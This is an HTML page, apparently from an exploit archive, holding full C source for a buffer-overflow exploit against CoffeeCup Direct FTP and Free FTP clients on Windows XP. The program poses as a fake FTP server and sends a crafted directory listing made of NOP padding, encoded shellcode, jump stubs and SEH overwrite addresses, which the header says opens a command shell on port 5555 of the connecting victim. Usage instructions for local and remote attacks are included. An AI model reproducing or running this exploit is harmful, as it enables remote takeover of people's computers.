<html><head><title>CoffeeCup FTP Clients (Direct <= 6.2.0.62) (Free <= 3.0.0.10) BoF Exploit</title></head><pre>/*************************************************************************************

	CoffeeCup FTP Clients Buffer Overflow Vulnerability Exploit
	created by Komrade
	e-mail:	unsecure(at)altervista(dot)org
	web:	http://unsecure.altervista.org

	Tested on:
    	CoffeeCup Direct FTP 6.2.0.62
        CoffeeCup Free FTP 3.0.0.10

        on a Windows XP Professional sp2 operating system.

	This exploit creates a fake FTP server on your machine, waiting for the
	connection of an FTP client.
	After the exploit is sent a shell (command prompt) is spawn on port 5555
	of the target machine.
	This exploit works locally or remotely.

	Usage: coffecupbof [direct | free] [-l] [-r server IP]

	Options:
	 direct | free	&quot;direct&quot; to exploit a CoffeeCup Direct FTP client
	 		&quot;free&quot; to exploit a CoffeeCup Free FTP client
	 -l		executed locally
	 -r serverIP	executed remotely. You need to specify the address
	 		of the FTP server for the PASV command (Insert your IP address)

	Examples:

	C:\&gt; coffeecupbof direct -l		exploit for CoffeeCup Direct FTP executed locally
	C:\&gt; coffeecupbof free -r 10.0.0.1      exploit for CoffeeCup Free FTP executed remotely

*****************************************************************************************/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
#include &lt;winsock.h&gt;

#define FTP_PORT 21
#define PASV_PORT 1106

int version, wait = TRUE;

DWORD WINAPI fileList(LPVOID data);

int main(int argc,char **argv){

	SOCKET sock, client;
	struct sockaddr_in sock_addr,client_addr;
	WSADATA data;
	WORD p;
	char mess[4096], received[512], addr[32];
	int lun, n, i, err;
	HANDLE fileListH;
	DWORD fileListId, exitCode;

	p = MAKEWORD(2, 0);
	WSAStartup(p, &amp;data);

	printf(&quot;------------------------------------------------------------------------------\r\n&quot;);
	printf(&quot;\tCoffeeCup FTP Clients Buffer Overflow Vulnerability Exploit\r\n&quot;);
	printf(&quot;\t\t\tcreated by Komrade\r\n\r\n&quot;);

	printf(&quot;\t\te-mail: unsecure(at)altervista(dot)org\r\n&quot;);
	printf(&quot;\t\tweb: http://unsecure.altervista.org\r\n&quot;);
	printf(&quot;------------------------------------------------------------------------------\r\n\r\n&quot;);

	if (((argc != 2) || (strcmp(argv[1], &quot;direct&quot;) != 0) || (strcmp(argv[1], &quot;free&quot;) != 0)) &amp;&amp; ((argc != 3) ||
 (strcmp(argv[2], &quot;-l&quot;) != 0)) &amp;&amp; ((argc != 4) || (strcmp(argv[2], &quot;-r&quot;) != 0))){
		printf(&quot;Usage: coffecupbof [direct | free] [-l] [-r server IP]\r\n\r\n&quot;);
		printf(&quot;Options:\r\n&quot;);
		printf(&quot; direct | free\t\&quot;direct\&quot; to exploit a CoffeeCup Direct FTP client\r\n&quot;);
		printf(&quot; \t\t\&quot;free\&quot; to exploit a CoffeeCup Free FTP client\r\n&quot;);
	 	printf(&quot; -l\t\tworks locally.\r\n&quot;);
		printf(&quot; -r server IP\tworks remotely. You need to specify the address of the\r\n&quot;);
		printf(&quot;\t\tFTP server for the PASV command (Insert your IP address)\r\n\r\n&quot;);
		printf(&quot;Examples:\r\n&quot;);
		printf(&quot; coffeecupbof direct -l\t\texploit for CoffeeCup Direct FTP\r\n\t\t\t\texecuted locally\r\n&quot;);
		printf(&quot; coffeecupbof free -r 10.0.0.1\texploit for CoffeeCup Free FTP\r
                                 \n\t\t\t\texecuted remotely\r\n&quot;);
		return 0;
	}

	if(strcmp(argv[1], &quot;direct&quot;) == 0)
		version = 1;
	else
		version = 2;

	if(strcmp(argv[2], &quot;-r&quot;) == 0){
		char *token[4];

		token[0]=strtok(argv[3], &quot;.&quot;);
		for(i = 1; i &lt; 4; i++){
			token[i]=strtok(NULL, &quot;.&quot;);
		}

		strcpy(addr, &quot;\0&quot;);

		for(i=0; (i &lt; 4) &amp;&amp; (token[i]!= NULL); i++){
			strlcat(addr, token[i], 16);
			strcat(addr, &quot;,&quot;);
		}
	}
	else
		strcpy(addr, &quot;127,0,0,1,&quot;);

	sock=socket(PF_INET,SOCK_STREAM,0);
	sock_addr.sin_family=PF_INET;
	sock_addr.sin_port=htons(FTP_PORT);
	sock_addr.sin_addr.s_addr=INADDR_ANY;

        err = bind(sock, (struct sockaddr*)&amp;sock_addr, sizeof(struct sockaddr_in));
	if (err &lt; 0){
		printf(&quot;Error in bind(). Port may be in use\r\n&quot;);
		return -1;
	}
	err = listen(sock,1);
	if (err &lt; 0){
		printf(&quot;Error in listen()\r\n&quot;);
		return -1;
	}

	lun = sizeof (struct sockaddr);

	printf(&quot;Opening the FTP port and waiting for connections...\r\n&quot;);
	client = accept(sock, (struct sockaddr*)&amp;client_addr, &amp;lun);
	printf(&quot;Client connected from IP: %s\r\n\r\n&quot;, inet_ntoa(client_addr.sin_addr));

	strcpy(mess, &quot;220 CoffeeCup FTP Clients Buffer Overflow Vulnerability Exploit\r\n&quot;);
	n=send(client, mess, strlen(mess), 0);
	if (n &lt; 0){
		printf(&quot;Error in send()\r\n&quot;);
		return -1;
	}

	while(wait == TRUE){

		Sleep(800);
		n = recv(client, received, sizeof(mess), 0);
		if (n &lt; 0){
			printf(&quot;Error in recv()\r\n&quot;);
			return -1;
		}

		received[n]=0;
		printf(&quot;CLIENT: %s&quot;, received);

		if (stricmp(&quot;USER&quot;, strtok(received, &quot; &quot;)) == 0)
			strcpy(mess, &quot;331 Anonymous access allowed, send password.\r\n&quot;);
		else if (stricmp(&quot;PASS&quot;, strtok(received, &quot; &quot;)) == 0)
			strcpy(mess, &quot;230 Anonymous user logged in.\r\n&quot;);
		else if (stricmp(&quot;PWD\r\n&quot;, received) == 0)
			strcpy(mess, &quot;257 \&quot;/\&quot; is current directory.\r\n&quot;);
		else if (stricmp(&quot;CWD&quot;, strtok(received, &quot; &quot;)) == 0)
			strcpy(mess, &quot;257 \&quot;/\&quot; is current directory.\r\n&quot;);
		else if (stricmp(&quot;TYPE&quot;, strtok(received, &quot; &quot;)) == 0)
			strcpy(mess, &quot;200 Type set to A.\r\n&quot;);
		else if (stricmp(&quot;PASV\r\n&quot;, received) == 0){
			fileListH = CreateThread(NULL, 0, fileList, NULL, 0, &amp;fileListId);
			if (fileListH == NULL)
				printf(&quot;Error in CreateThread() %d&quot;, GetLastError());
			wsprintf(mess, &quot;227 Entering Passive Mode (%s4,82).\r\n&quot;, addr);
		}
		else if (stricmp(&quot;LIST&quot;, strtok(received, &quot; &quot;)) == 0 || stricmp(&quot;LIST\r\n&quot;, received) == 0){
			strcpy(mess, &quot;125 Data connection already open; Transfer starting.\r\n&quot;);
			printf(&quot;SERVER: %s\r\n&quot;, mess);
			n=send(client, mess, strlen(mess), 0);
			if (n &lt; 0){
				printf(&quot;Error in send()\r\n&quot;);
				return -1;
			}
			wait = FALSE;

			do{
				GetExitCodeThread(fileListH, &amp;exitCode);
				Sleep(100);
			}
			while(exitCode == STILL_ACTIVE);
			printf(&quot;&lt; Long file name sent to client &gt;\r\n\r\n&quot;);

			strcpy(mess, &quot;226 Transfer complete.\r\n&quot;);
		}
		else
			strcpy(mess, &quot;550 Unimplemented\r\n&quot;);

		printf(&quot;SERVER: %s\r\n&quot;, mess);
		n = send(client, mess, strlen(mess), 0);
		if (n &lt; 0){
				printf(&quot;Error in send()\r\n&quot;);
				return -1;
		}
	}

	printf(&quot;Wait.......&quot;);
	Sleep(2000);
	printf(&quot;Exploit succesfully sent!\r\n&quot;);
	printf(&quot;Connect to %s port 5555 for the shell\r\n&quot;, inet_ntoa(client_addr.sin_addr));

	closesocket (client);
	closesocket(sock);

	WSACleanup();
	return 0;
}

DWORD WINAPI fileList(LPVOID data){

	char shellcode[] =
	&quot;\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA\xEB&quot;
	&quot;\x05\xE8\xEB\xFF\xFF\xFF\x70\x99\x98\x99\x99\xC3\xFD\x12\xD8\xA9\x12&quot;
	&quot;\xD9\x95\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12&quot;
	&quot;\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8&quot;
	&quot;\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E&quot;
	&quot;\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A&quot;
	&quot;\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12&quot;
	&quot;\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71\xE5&quot;
	&quot;\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3\x9D\xC0&quot;
	&quot;\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x69\x12&quot;
	&quot;\x41\x5E\x9E\x9B\x99\x8C\x2A\xAA\x59\x10\xDE\x9D\xF3\x89\xCE\xCA\x66&quot;
	&quot;\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66\xCE\x65\x1A\x75\xDD&quot;
	&quot;\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B\x62\x10\xDF\xA1\x10\xDF&quot;
	&quot;\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99\x99\x14\xDE\x89\xC9\xCF\xCA&quot;
	&quot;\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9&quot;
	&quot;\xCA\x66\xCE\x7D\xC9\x66\xCE\x71\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB&quot;
	&quot;\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66&quot;
	&quot;\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB&quot;
	&quot;\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED&quot;
	&quot;\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8&quot;
	&quot;\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA&quot;
	&quot;\xF2\xFC\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99&quot;
	&quot;\xF8\xFA\xFA\xFC\xE9\xED\x99&quot;;

	char shelljump1[] =	&quot;\x90\xEB\xBA\x90&quot;;

	char shelljump2[] =
	&quot;\x58\xB9\x21\xFC\xFF\xFF\xF7\xD1\x2B\xC1\xFF\xE0\xE8\xEF\xFF\xFF\xFF&quot;;

	char SEHAddr1[] = &quot;\x50\x39\x06\x6D&quot;;
	char SEHAddr2[] = &quot;\x0D\xA8\x03\x6D&quot;;


	SOCKET sock, client, list;
	struct sockaddr_in sock_addr,client_addr;

	WSADATA wData;
	WORD p;
	char mess[4096];
	int lun, n, i, err;

	p = MAKEWORD(2, 0);
	WSAStartup(p, &amp;wData);

	sock=socket(PF_INET,SOCK_STREAM,0);
	sock_addr.sin_family=PF_INET;
	sock_addr.sin_port=htons(PASV_PORT);
	sock_addr.sin_addr.s_addr=INADDR_ANY;
        err = bind(sock, (struct sockaddr*)&amp;sock_addr, sizeof(struct sockaddr_in));
	if (err &lt; 0){
		printf(&quot;Error in bind(). Port may be in use\r\n&quot;);
		return -1;
	}
	err = listen(sock,1);
	if (err &lt; 0){
		printf(&quot;Error in listen().\r\n&quot;);
		return -1;
	}

	lun = sizeof (struct sockaddr);

	client = accept(sock, (struct sockaddr*)&amp;client_addr, &amp;lun);

	while (wait == TRUE)
		Sleep(100);

	strcpy(mess, &quot;03-04-81 12:00PM 3 &quot;);

	for(i=strlen(mess); i&lt;100; i++)
		mess[i]=0x90;
	mess[i]='\0';

	strcat(mess, shellcode);

	for(i=strlen(mess); i&lt;1000; i++)
		mess[i]=0x90;
	mess[i]='\0';

	strcat(mess, shelljump2);

	for(i=strlen(mess); i&lt;1079; i++)
		mess[i]=0x90;
	mess[i]='\0';

	strcat(mess, shelljump1);
	if (version == 1)
		strcat(mess, SEHAddr1);
	else
		strcat(mess, SEHAddr2);

	for(i=strlen(mess); i&lt;1300; i++) // cause the exception
		mess[i]='b';
	mess[i]='\0';

	strcat(mess, &quot;\r\n&quot;);

	n = send(client, mess, strlen(mess), 0);
	if (n &lt; 0){
		printf(&quot;Error in send()\r\n&quot;);
		return -1;
	}

	closesocket(sock);
	closesocket(client);
	WSACleanup();

	return 0;
}

// milw0rm.com [2004-11-22]</pre></html>